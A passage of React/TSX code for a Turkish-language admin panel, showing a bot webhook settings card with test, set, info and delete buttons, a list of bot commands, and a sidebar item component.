            <div className={`p-3 rounded-xl border ${darkMode ? 'bg-black/30 border-white/10' : 'bg-gray-50 border-gray-200'}`}>
              <div className="text-[10px] font-bold uppercase tracking-widest opacity-60 mb-1">Webhook Gizli Anahtar</div>
              <div className="font-bold">{status.hasWebhookSecret ? "🔐 Ayarlanmış" : "— Yok"}</div>
            </div>
          </div>
        )}

        {msg && (
          <div className={`px-4 py-2.5 rounded-xl text-[12px] font-bold ${msgType === "ok" ? (darkMode ? 'bg-green-500/15 text-green-400 border border-green-500/30' : 'bg-green-50 text-green-700 border border-green-200') : (darkMode ? 'bg-red-500/15 text-red-400 border border-red-500/30' : 'bg-red-50 text-red-700 border border-red-200')}`}>
            {msg}
          </div>
        )}

        <div className={`flex flex-wrap gap-2 pt-2 border-t ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
          <button
            onClick={() => void run("test", { extra: "Admin panelinden test mesajı 👋" }, "Test Mesajı")}
            disabled={!!busy || !status?.configured}
            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-green-500/15 text-green-400 hover:bg-green-500/25 border border-green-500/30' : 'bg-green-50 text-green-700 hover:bg-green-100 border border-green-200'}`}
          >{busy === "Test Mesajı" ? "Gönderiliyor..." : "✉️ TEST MESAJI"}</button>
          <button
            onClick={() => void run("set-webhook", undefined, "Webhook Ayarla")}
            disabled={!!busy || !status?.configured}
            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-[#EB5E28]/15 text-[#ff8a5c] hover:bg-[#EB5E28]/25 border border-[#EB5E28]/30' : 'bg-[#fff0e7] text-[#c24815] hover:bg-[#ffe2d0] border border-[#f1b998]'}`}
          >{busy === "Webhook Ayarla" ? "Ayarlanıyor..." : "🔗 SET WEBHOOK"}</button>
          <button
            onClick={() => void run("get-webhook-info", undefined, "Webhook Bilgi")}
            disabled={!!busy || !status?.configured}
            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-white/10 text-gray-200 hover:bg-white/20 border border-white/10' : 'bg-gray-100 text-gray-700 hover:bg-gray-200 border border-gray-200'}`}
          >{busy === "Webhook Bilgi" ? "..." : "ℹ️ WEBHOOK INFO"}</button>
          <button
            onClick={() => void run("delete-webhook", undefined, "Webhook Sil")}
            disabled={!!busy || !status?.configured}
            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20' : 'bg-red-50 text-red-600 hover:bg-red-100 border border-red-200'}`}
          >{busy === "Webhook Sil" ? "..." : "🗑️ WEBHOOK SİL"}</button>
        </div>

        {status?.configured && (
          <div className={`pt-2 text-[11px] opacity-70 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
            💡 Bot komutları: <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/help</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/stats</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/logs 20</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/ban 1.2.3.4</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/unban 1.2.3.4</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/session ID</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/redirect ID step</code>
          </div>
        )}
      </div>
    </div>
  );
}

function SidebarItem({ icon, label, active, isCollapsed, darkMode, onClick }: { icon: string, label: string, active?: boolean, isCollapsed: boolean, darkMode: boolean, onClick: () => void }) {
  return (
    <a href="#" onClick={(e) => { e.preventDefault(); onClick(); }} className={`flex items-center px-4 py-3.5 rounded-xl transition-all duration-300 group ${active ? (darkMode ? 'bg-white/10 shadow-sm' : 'bg-white shadow-sm border border-gray-200/50') : (darkMode ? 'hover:bg-white/5' : 'hover:bg-black/5')}`}>
      <div className={`p-1.5 rounded-lg transition-colors ${active ? 'bg-[#EB5E28] text-white shadow-md' : (darkMode ? 'text-gray-400 group-hover:text-white' : 'text-gray-500 group-hover:text-black')}`}>
        <svg className="w-5 h-5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={active ? 2.5 : 2} d={icon} />
        </svg>
      </div>
      {!isCollapsed && <span className={`ml-3 text-sm font-semibold tracking-wide transition-colors ${active ? (darkMode ? 'text-white' : 'text-black') : (darkMode ? 'text-gray-400 group-hover:text-white' : 'text-gray-600 group-hover:text-black')}`}>{label}</span>}
    </a>
  );
}
